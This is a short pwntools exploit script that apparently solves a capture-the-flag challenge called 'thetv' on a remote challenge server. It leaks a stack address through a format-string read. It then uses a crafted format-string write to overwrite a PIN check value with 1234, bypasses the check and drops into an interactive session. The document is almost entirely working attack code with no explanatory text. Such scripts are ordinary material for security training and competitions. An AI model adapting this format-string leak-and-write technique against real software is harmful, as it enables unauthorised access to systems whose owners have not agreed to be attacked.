#! /usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./thetv')
local = False
GDBSCPT = '''
b *checkPin
b *checkPin+38
'''

OFFSET = 16

# context.log_level="debug"
if local:
    conn = elf.process()
    # gdb.attach(conn, gdbscript=GDBSCPT)
else:
    host = '0.cloud.chals.io'
    port = 30658
    conn = remote(host, port)

conn.sendlineafter('>', b'p')
conn.sendlineafter('>', b'%12$p')
TARGET_ADDR = int(conn.recvline().strip().decode().split(' ')[-1],16)
log.info(f'Target address: {hex(TARGET_ADDR)}')


conn.sendlineafter('>', b'p')
payload = fmtstr_payload(OFFSET, {TARGET_ADDR: p64(0x4d2)})
conn.sendlineafter('>', payload)

conn.sendlineafter('>', b'c')
conn.sendlineafter('>', b'y')
conn.sendlineafter('>', b'6')
conn.sendlineafter('Enter in the pin: ', b'1234')

conn.interactive()
conn.close()
